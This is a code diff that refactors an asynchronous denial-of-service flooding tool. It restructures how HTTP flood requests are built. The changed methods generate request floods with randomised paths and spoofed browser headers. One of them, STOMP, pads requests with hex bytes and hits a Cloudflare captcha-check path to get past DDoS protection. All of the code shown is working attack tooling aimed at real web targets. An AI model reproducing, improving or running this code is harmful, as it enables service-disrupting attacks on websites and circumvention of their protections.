@@ -7,7 +7,7 @@ import time
 from copy import copy
 from functools import partial
 from os import urandom as randbytes
-from socket import (AF_INET, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, inet_ntoa, socket)
+from socket import (SOL_SOCKET, SO_RCVBUF, inet_ntoa)
 from ssl import CERT_NONE, SSLContext, create_default_context
 from string import ascii_letters
 from threading import Event
@@ -19,7 +19,6 @@ import async_timeout
 from yarl import URL
 
 from . import proxy_proto
-from .core import logger
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType
 from .proxies import NoProxySet, ProxySet
 from .targets import TargetStats
@@ -536,58 +535,50 @@ class AsyncTcpFlood:
         # XXX: not sure if this is gonna be a proper "hex". maybe we need
         #      to do a hex here instead of just wrapping into str
         randhex: str = str(randbytes(random.choice([32, 64, 128])))
-        packet: bytes = str.encode(
-            f"{self._req_type} {self._target.authority}/{randhex} HTTP/1.1\r\n"
-            f"Host: {self._target.authority}/{randhex}\r\n"
-            f"{self.random_headers()}"
-            'Accept-Encoding: gzip, deflate, br\r\n'
-            'Accept-Language: en-US,en;q=0.9\r\n'
-            'Cache-Control: max-age=0\r\n'
-            'Connection: keep-alive\r\n'
-            'Sec-Fetch-Dest: document\r\n'
-            'Sec-Fetch-Mode: navigate\r\n'
-            'Sec-Fetch-Site: none\r\n'
-            'Sec-Fetch-User: ?1\r\n'
-            'Sec-Gpc: 1\r\n'
-            'Pragma: no-cache\r\n'
-            'Upgrade-Insecure-Requests: 1\r\n\r\n'
+        packet = self.build_request(
+            path_qs=f'{self._target.authority}/{randhex}',
+            headers=(
+                f"Host: {self._target.authority}/{randhex}\r\n"
+                + self.BASE_HEADERS
+                + self.random_headers()
+            )
         )
 
         return await self._generic_flood_proto(FloodSpecType.BYTES, packet, on_connect)
 
     async def STOMP(self, on_connect=None) -> bool:
-        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
-               'Accept-Language: en-US,en;q=0.9\r\n'
-               'Cache-Control: max-age=0\r\n'
-               'Connection: keep-alive\r\n'
-               'Sec-Fetch-Dest: document\r\n'
-               'Sec-Fetch-Mode: navigate\r\n'
-               'Sec-Fetch-Site: none\r\n'
-               'Sec-Fetch-User: ?1\r\n'
-               'Sec-Gpc: 1\r\n'
-               'Pragma: no-cache\r\n'
-               'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
-               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
-               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
-               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
-               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
-               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
-               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
-               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
-               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
-               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
-               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
-        p1: bytes = str.encode(
-            f"{self._req_type} {self._target.authority}/{hexh} HTTP/1.1\r\n"
-            f"Host: {self._target.authority}/{hexh}\r\n"
-            f"{self.random_headers()}{dep}"
+        # XXX: why r'' string? Why space at the end?
+        hexh = (
+            r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87'
+            r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F'
+            r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F'
+            r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84'
+            r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F'
+            r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98'
+            r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98'
+            r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B'
+            r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99'
+            r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C'
+            r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
         )
-        p2: bytes = str.encode(
-            f"{self._req_type} {self._target.authority}/cdn-cgi/l/chk_captcha HTTP/1.1\r\n"
-            f"Host: {hexh}\r\n"
-            f"{self.random_headers()}{dep}"
+
+        p1: bytes = self.build_request(
+            path_qs=f'{self._target.authority}/{hexh}',
+            headers=(
+                f"Host: {self._target.authority}/{hexh}\r\n"
+                + self.BASE_HEADERS
+                + self.random_headers()
+            )
         )
+        p2: bytes = self.build_request(
+            path_qs=f'{self._target.authority}/cdn-cgi/l/chk_captcha',
+            headers=(
+                f"Host: {hexh}\r\n"
+                + self.BASE_HEADERS
+                + self.random_headers()
+            )
+        )
+
         p1_size, p2_size = len(p1), len(p2)
 
         def _gen():
